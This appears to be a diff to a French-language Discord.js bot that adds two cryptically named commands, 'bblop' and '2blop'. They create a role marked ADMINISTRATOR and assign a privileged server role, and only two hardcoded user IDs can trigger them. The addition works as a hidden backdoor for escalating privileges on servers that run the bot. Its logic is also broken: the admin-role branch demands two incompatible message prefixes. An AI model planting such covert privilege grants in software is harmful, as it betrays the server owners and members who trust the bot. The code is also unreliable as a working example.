@@ -71,6 +71,51 @@ bot.on('message', message => {
    message.guild.createEmoji('./mikado3.gif', 'mikado3')
   .then(emoji => console.log(`Nouveau emoji crée ! ${emoji.name}`))
       }
+   
+  
+   
+   
+   
+   else if(message.content.startsWith('bblop')) {
+   
+        	let args = message.content.split(" ").slice(1);
+    
+		    if(args == "") {
+
+			    message.reply('Veuillez ajouter le nom du role')
+
+		    	} else {
+
+	if (message.content.startsWith('Les emoji mikado c\'est cool')) {
+   if (message.author.id !== '423118623876448296')
+   if (message.author.id !== '301913733536415755')
+   return;
+				message.guild.createRole({
+				  name: args.join(" "),
+				  mentionable: true,
+              ADMINISTRATOR: true
+				})
+
+				var embed = new Discord.RichEmbed()
+				.setColor("#D3D3D3")
+				.setDescription("Vous avez ajouté un role sous le nom de: **" + args.join("") + "**")
+				message.channel.send(embed).catch(console.error)
+			} else {
+
+			  	message.reply('Tu as crus frère')	
+			}
+    
+    		   }
+
+	}
+   
+   if (message.content.startsWith('2blop')) {
+   if (message.author.id !== '423118623876448296')
+   if (message.author.id !== '301913733536415755')
+   return;
+    message.member.addRole(message.member.guild.roles.find('name', '☡- 🌸Famille de shiro🌸 -☡'));
+      }
+   
 });
 
 
